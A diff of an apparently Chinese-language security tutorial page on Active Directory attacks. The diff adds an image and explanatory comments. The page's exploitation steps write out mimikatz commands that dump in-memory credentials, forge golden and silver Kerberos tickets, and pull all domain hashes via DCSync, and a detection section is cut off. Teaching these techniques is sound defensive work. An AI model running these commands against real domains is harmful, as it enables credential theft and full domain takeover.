@@ -19,7 +19,7 @@
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>黄金票据 = 拿到 krbtgt 哈希 → 伪造任意用户 TGT
 </span></span><span class=line><span class=cl>白银票据 = 拿到服务账号哈希 → 伪造服务票据（不经过 KDC）
 </span></span><span class=line><span class=cl>DCSync = 有 Replicating 权限 → 直接同步域管哈希
-</span></span></code></pre></td></tr></table></div></div><h2 id=二影响与危害>二、影响与危害</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><h2 id=二影响与危害>二、影响与危害</h2><img src=/img/ad-attack-path.svg alt=域渗透攻击路径图><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>黄金票据：持久存在、域内任意访问，改密码也不一定失效（krbtgt 需两次）
@@ -27,12 +27,16 @@
 </span></span><span class=line><span class=cl>DCSync：直接拿到域管/其他账号哈希，一击致命
 </span></span></code></pre></td></tr></table></div></div><p>风险等级：<strong>严重</strong>，基本等于域失守。</p><h2 id=三利用--复现>三、利用 / 复现</h2><h3 id=第一步拿到权限与哈希>第一步：拿到权限与哈希</h3><p>在已控制的域内机器上，用 mimikatz 抓取凭据：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
+</span><span class=lnt>3
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>privilege::debug
 </span></span><span class=line><span class=cl>sekurlsa::logonpasswords
+</span></span><span class=line><span class=cl># 解释：privilege::debug 提调试权限；logonpasswords 抓内存中的哈希/明文
 </span></span></code></pre></td></tr></table></div></div><p>要伪造黄金票据，需要 <code>krbtgt</code> 的哈希 + 域的 SID。</p><h3 id=第二步生成黄金票据>第二步：生成黄金票据</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
+</span><span class=lnt>3
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>kerberos::golden /user:administrator /domain:corp.local \
 </span></span><span class=line><span class=cl>  /sid:S-1-5-21-xxx /krbtgt:<span class=p>&lt;</span>krbtgt哈希<span class=p>&gt;</span> /ptt
+</span></span><span class=line><span class=cl># 解释：用 krbtgt 哈希伪造管理员 TGT，/ptt 直接注入当前会话
 </span></span></code></pre></td></tr></table></div></div><p><code>/ptt</code> 直接把票据注入当前会话，即可访问域内任意资源。</p><h3 id=第三步白银票据>第三步：白银票据</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
@@ -41,8 +45,10 @@
 </span></span><span class=line><span class=cl>  /rc4:<span class=p>&lt;</span>服务账号哈希<span class=p>&gt;</span> /ptt
 </span></span></code></pre></td></tr></table></div></div><h3 id=第四步dc-同步dcsync>第四步：DC 同步（DCSync）</h3><p>用具备复制权限的账号：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
+</span><span class=lnt>3
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>lsadump::dcsync /domain:corp.local /user:krbtgt
 </span></span><span class=line><span class=cl>lsadump::dcsync /domain:corp.local /all
+</span></span><span class=line><span class=cl># 解释：DCSync 通过复制协议远程拉取目标账号哈希，无需登录目标机器
 </span></span></code></pre></td></tr></table></div></div><p>即可远程拿到目标账号哈希，进而制作黄金票据或直接登录。</p><h2 id=四检测>四、检测</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
